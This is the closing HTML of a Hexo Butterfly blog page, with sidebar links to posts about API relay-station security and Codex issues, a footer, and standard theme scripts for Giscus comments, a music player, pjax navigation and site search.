href="/2026/06/06/API%E4%B8%AD%E8%BD%AC%E7%AB%99%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3-%E5%BD%93AI-Agent%E9%81%87%E4%B8%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%90%86/" title="API 中转站的安全隐患：当 AI Agent 遇上恶意代理">API 中转站的安全隐患：当 AI Agent 遇上恶意代理</a><time datetime="2026-06-06T12:00:00.000Z" title="发表于 2026年06月06日 20:00:00">2026年06月06日</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/04/API%E4%B8%AD%E8%BD%AC%E7%AB%99%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="API 中转站深度解析：商业模式、安全风险与自建指南"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="API 中转站深度解析：商业模式、安全风险与自建指南"/></a><div class="content"><a class="title" href="/2026/06/04/API%E4%B8%AD%E8%BD%AC%E7%AB%99%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/" title="API 中转站深度解析：商业模式、安全风险与自建指南">API 中转站深度解析：商业模式、安全风险与自建指南</a><time datetime="2026-06-04T12:00:00.000Z" title="发表于 2026年06月04日 20:00:00">2026年06月04日</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/19/%E4%BD%BF%E7%94%A8codex%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" title="使用codex时遇到的问题及解决方案"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-95y77d_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="使用codex时遇到的问题及解决方案"/></a><div class="content"><a class="title" href="/2026/05/19/%E4%BD%BF%E7%94%A8codex%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" title="使用codex时遇到的问题及解决方案">使用codex时遇到的问题及解决方案</a><time datetime="2026-05-19T08:47:52.000Z" title="发表于 2026年05月19日 16:47:52">2026年05月19日</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://raw.githubusercontent.com/Doub1e007/blog-images/main/images/wallhaven-xl8kzl_1920x1080.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2026 By Doub1e007</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'Doub1e007/Doub1e007.github.io',
+      'data-repo-id': 'R_kgDONwyjZA',
+      'data-category-id': 'DIC_kwDONwyjZM4C93Zl',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
